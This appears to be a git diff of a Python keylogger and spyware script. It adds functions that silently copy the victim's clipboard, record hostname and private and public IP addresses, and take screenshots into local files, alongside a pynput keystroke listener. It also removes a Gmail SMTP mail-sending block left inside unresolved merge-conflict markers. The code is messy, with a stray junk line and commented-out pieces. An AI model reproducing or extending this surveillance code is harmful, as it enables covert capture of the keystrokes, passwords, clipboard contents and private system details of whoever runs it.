@@ -10,15 +10,16 @@ import threading
 # email
 
 from email.mime.multipart import MIMEMultipart
-from email.mime.text import MINEText
+from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
+from email import encoders
 import smtplib
 
 import socket
 import platform
 
 import win32clipboard
-sssssssssssssssssssssssssssssssssssssssssssssdsdsdd
+
 # info
 
 import time
@@ -47,7 +48,7 @@ from PIL import ImageGrab
 # config
 ########################################
 
-subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
+#subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
 #subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'ncat'])
 from pynput.keyboard import Key, Listener
 # Hidden file attribute
@@ -58,12 +59,57 @@ count = 0
 
 # List to store the pressed tang
 tangs = []
-
+sys_info = "syseminfo.txt"
+clip_inf = "clip_inf.txt"
+screen = "screen.png"
+fil = "PATH"
+extend = "\\"
 ########################################
 # tang
 ########################################
 
 # Callback function to handle tang press events
+
+
+def computer_information():
+    with open(fil + extend + sys_info, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get Public IP Address (most likely max query")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+def copy_clipboard():
+    with open(fil + extend + clip_inf, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+# get screenshots
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(fil + extend + screen)
+
+#screenshot()
+
+copy_clipboard()
+
+computer_information()
 def on_press(tang):
     global tangs, count
 
@@ -111,48 +157,5 @@ def write_file(tangs):
 # start
 ########################################
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
-
-<<<<<<< Updated upstream
-
-    import smtplib
-
-# creates SMTP session
-s = smtplib.SMTP('smtp.gmail.com', 587)
-
-# start TLS for security
-s.starttls()
-
-# Authentication
-s.login("sender_email_id", "sender_email_id_password")
-
-# message to be sent
-message = "Message_you_need_to_send"
-
-# sending the mail
-s.sendmail("sender_email_id", "receiver_email_id", message)
-
-# terminating the session
-s.quit()
-=======
-import smtplib
- 
-# creates SMTP session
-s = smtplib.SMTP('smtp.gmail.com', 587)
- 
-# start TLS for security
-s.starttls()
- 
-# Authentication
-s.login("sender_email_id", "sender_email_id_password")
- 
-# message to be sent
-message = "Message_you_need_to_send"
- 
-# sending the mail
-s.sendmail("sender_email_id", "receiver_email_id", message)
- 
-# terminating the session
-s.quit()
->>>>>>> Stashed changes
+#with Listener(on_press=on_press, on_release=on_release) as listener:
+   # listener.join()
